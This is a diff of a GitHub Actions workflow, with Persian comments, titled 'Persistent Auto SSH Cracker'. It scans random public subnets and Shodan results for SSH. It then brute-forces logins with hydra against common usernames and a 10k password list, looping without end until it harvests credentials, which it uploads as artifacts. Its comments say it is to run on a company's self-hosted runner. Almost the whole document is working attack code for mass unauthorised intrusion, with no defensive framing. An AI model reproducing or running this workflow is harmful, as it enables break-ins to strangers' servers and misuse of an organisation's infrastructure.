@@ -1,131 +1,109 @@
-name: Turbo SSH Cracker - No Repeat
+name: ∞ Persistent Auto SSH Cracker
 
 on:
-  workflow_dispatch:
-    inputs:
-      mode:
-        description: 'mode: manual / auto'
-        default: 'manual'
-      manual_range:
-        description: 'manual: IP range (CIDR)'
-        required: false
-      auto_type:
-        description: 'auto: random / list'
-        default: 'random'
-      usernames:
-        description: 'usernames (comma)'
-        default: 'root,admin'
-      threads_per_shard:
-        description: 'hydra threads per shard'
-        default: '128'
-      rate:
-        description: 'masscan rate (packets/sec)'
-        default: '5000'
+  workflow_dispatch:  # فقط دستی
 
 jobs:
-  discover-hosts:
-    runs-on: ubuntu-latest
-    outputs:
-      hosts_file: hosts.txt
-    steps:
-      - name: Install masscan
-        run: sudo apt update && sudo apt install -y masscan
-      - name: Scan for open SSH
-        run: |
-          if [ "${{ github.event.inputs.mode }}" = "manual" ]; then
-            sudo masscan ${{ github.event.inputs.manual_range }} -p22 --rate=${{ github.event.inputs.rate }} -oL scan.raw
-          else
-            # auto: تولید تصادفی یا از لیست (ساده شده)
-            echo "8.8.8.8:22" > scan.raw
-            echo "1.1.1.1:22" >> scan.raw
-          fi
-          grep -E "open" scan.raw | awk '{print $4":"$3}' > hosts.txt
-      - name: Upload hosts
-        uses: actions/upload-artifact@v4
-        with:
-          name: all-hosts
-          path: hosts.txt
-
-  attack:
-    needs: discover-hosts
-    runs-on: ubuntu-latest
+  auto-attack:
+    runs-on: [self-hosted, linux]  # حتماً باید روی رانر شخصی شرکت اجرا بشه
     strategy:
       fail-fast: false
       matrix:
         shard: [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14]
+
     steps:
-      - name: Install hydra & sshpass
-        run: sudo apt update && sudo apt install -y hydra sshpass
-
-      - name: Download hosts & dictionary
-        uses: actions/download-artifact@v4
-        with:
-          name: all-hosts
-          path: ./scan
-
-      - name: Prepare password dictionary (10k common)
+      - name: 🛠️ Install ultra tools
         run: |
-          curl -s -o pass.txt https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt
-          # اگه failed باشه یه دیکشنری کوچک بساز
-          if [ ! -s pass.txt ]; then echo -e "123456\npassword\nadmin\nroot" > pass.txt; fi
+          sudo apt update
+          sudo apt install -y masscan hydra sshpass jq curl
 
-      - name: Shard hosts by hash (each host tested only by one shard)
-        id: shard
+      - name: 🔁 Persistent loop (never stops until success)
+        id: persistent
         run: |
           SHARD_ID=${{ matrix.shard }}
           TOTAL_SHARDS=${{ strategy.job-total }}
-          MY_HOSTS="my_hosts_${SHARD_ID}.txt"
-          > $MY_HOSTS
-          while read line; do
-            ip=$(echo $line | cut -d: -f1)
-            # محاسبه hash ساده با awk
-            hash=$(echo $ip | awk -F. '{print ($1*16777619 + $2*16777619 + $3*16777619 + $4) % 65536}')
-            if [ $((hash % TOTAL_SHARDS)) -eq $SHARD_ID ]; then
-              echo $line >> $MY_HOSTS
+          FOUND=0
+          RESULT_FILE="creds_${SHARD_ID}.txt"
+          PASSWORDS_FILE="passwords.txt"
+          # دیکشنری بزرگ رمز (میتونی فایل رو از جای دیگه بیاری)
+          curl -s -o $PASSWORDS_FILE https://raw.githubusercontent.com/danielmiessler/SecLists/master/Passwords/Common-Credentials/10k-most-common.txt || \
+            echo -e "123456\npassword\nadmin\nroot\n12345678" > $PASSWORDS_FILE
+
+          USERNAMES=("root" "admin" "user" "ubuntu" "pi" "oracle")
+
+          # حلقه بی‌نهایت
+          while [ $FOUND -eq 0 ]; do
+            echo "[*] Auto-discovering fresh targets (Shard $SHARD_ID)..."
+
+            # ========== 1. کشف خودکار هاست ==========
+            TARGETS_FILE="targets_${SHARD_ID}.txt"
+            > $TARGETS_FILE
+
+            # روش اول: استفاده از Shodan (اگر API key تنظیم شده باشد)
+            if [ -n "${{ secrets.SHODAN_API_KEY }}" ]; then
+              curl -s "https://api.shodan.io/shodan/host/search?key=${{ secrets.SHODAN_API_KEY }}&query=port:22&size=100" | \
+                jq -r '.matches[] | .ip_str + ":22"' >> $TARGETS_FILE
             fi
-          done < scan/hosts.txt
-          echo "hosts_count=$(cat $MY_HOSTS | wc -l)" >> $GITHUB_OUTPUT
 
-      - name: Attack my hosts without repeating password attempts
-        run: |
-          USERNAMES=$(echo '${{ github.event.inputs.usernames }}' | tr ',' '\n')
-          PASSWORDS="pass.txt"
-          SUCCESS_FILE="success_${{ matrix.shard }}.txt"
-          FAILED_FILE="failed_${{ matrix.shard }}.txt"
-          touch $SUCCESS_FILE $FAILED_FILE
-          
-          # استفاده از set برای جلوگیری از تکرار (فقط برای همین اجرا)
-          declare -A tested
-          while read hostline; do
-            ip=$(echo $hostline | cut -d: -f1)
-            port=$(echo $hostline | cut -d: -f2)
-            for user in $USERNAMES; do
-              while IFS= read -r pass; do
-                key="${ip}:${port}:${user}:${pass}"
-                if [[ -n "${tested[$key]}" ]]; then
-                  continue  # قبلاً تست شده
-                fi
-                tested[$key]=1
-                # تست با hydra روی یک هدف (با timeout کم)
-                timeout 5 hydra -l "$user" -p "$pass" -s "$port" -t 1 -o /dev/null "$ip" ssh 2>/dev/null | grep -q "host: $ip.*password:"
-                if [ $? -eq 0 ]; then
-                  echo "✅ $ip:$port|$user|$pass" | tee -a $SUCCESS_FILE
-                  # اگه پیدا شد، می‌تونی break کنی (اختیاری)
+            # اگر تعداد هاست کم است، مکمل با masscan تصادفی روی چند شبکه عمومی (به صورت تصادفی)
+            if [ $(wc -l < $TARGETS_FILE) -lt 50 ]; then
+              # تولید یک زیرشبکه تصادفی کلاس C
+              RANDOM_A=$((RANDOM%223+1))
+              RANDOM_B=$((RANDOM%256))
+              RANDOM_C=$((RANDOM%256))
+              SUBNET="${RANDOM_A}.${RANDOM_B}.${RANDOM_C}.0/24"
+              sudo masscan $SUBNET -p22 --rate=1000 --wait=0 -oL masscan.raw 2>/dev/null
+              grep -E "open" masscan.raw | awk '{print $4":"$3}' >> $TARGETS_FILE
+            fi
+
+            # حذف تکراری‌ها
+            sort -u -o $TARGETS_FILE $TARGETS_FILE
+
+            # ========== 2. تقسیم هاست بین شاردها با هش ==========
+            MY_HOSTS="myhosts_${SHARD_ID}.txt"
+            > $MY_HOSTS
+            while read line; do
+              ip=$(echo $line | cut -d: -f1)
+              # هش ساده آی‌پی برای اختصاص به یک شارد
+              hash=$(echo $ip | md5sum | cut -c1-8)
+              hash_num=$((16#$hash))
+              if [ $((hash_num % TOTAL_SHARDS)) -eq $SHARD_ID ]; then
+                echo $line >> $MY_HOSTS
+              fi
+            done < $TARGETS_FILE
+
+            if [ ! -s $MY_HOSTS ]; then
+              echo "No hosts assigned to shard $SHARD_ID, sleeping 10s..."
+              sleep 10
+              continue
+            fi
+
+            # ========== 3. حمله با Hydra روی هاست‌های خود ==========
+            while read target; do
+              ip=$(echo $target | cut -d: -f1)
+              port=$(echo $target | cut -d: -f2)
+
+              for username in "${USERNAMES[@]}"; do
+                # تنظیم timeout برای هر هاست
+                echo "[>] Shard $SHARD_ID attacking $ip:$port as $username"
+                hydra -l "$username" -P $PASSWORDS_FILE -s "$port" -t 64 -o hydra_out.txt -f "$ip" ssh 2>/dev/null
+
+                if grep -q "host: $ip.*password:" hydra_out.txt; then
+                  password=$(grep "host: $ip.*password:" hydra_out.txt | head -1 | awk -F 'password: ' '{print $2}')
+                  echo "🎉 SUCCESS: $ip:$port|$username|$password" | tee -a $RESULT_FILE
+                  FOUND=1
                   break 3
-                else
-                  echo "$key" >> $FAILED_FILE
                 fi
-              done < $PASSWORDS
-            done
-          done < my_hosts_${{ matrix.shard }}.txt
-          
-          if [ -s $SUCCESS_FILE ]; then
-            echo "success=true" >> $GITHUB_OUTPUT
-          fi
+              done
+            done < $MY_HOSTS
 
-      - name: Upload success
-        if: steps.shard.outputs.hosts_count != '0'
+            # اگر پیدا نشد، سریع بره مرحله بعد (بدون sleep)
+            echo "No credentials found in this batch. Scanning new targets..."
+          done
+
+      - name: Upload credentials (if found)
+        if: always()
         uses: actions/upload-artifact@v4
         with:
-          name: success-shard-${{ matrix.shard }}
-          path: success_${{ matrix.shard }}.txt
+          name: final-creds-shard-${{ matrix.shard }}
+          path: creds_*.txt
